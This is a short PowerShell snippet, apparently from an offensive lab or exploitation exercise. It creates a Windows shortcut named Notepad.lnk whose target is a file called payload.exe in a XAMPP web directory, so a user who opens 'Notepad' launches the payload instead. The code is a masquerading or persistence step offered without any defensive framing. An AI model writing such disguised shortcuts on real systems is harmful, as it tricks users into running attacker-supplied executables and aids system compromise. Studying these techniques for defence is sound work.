$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("c:\Common Applications\Notepad.lnk")
$lnk.TargetPath = "c:\xampp\htdocs\payload.exe"
$lnk.Save()

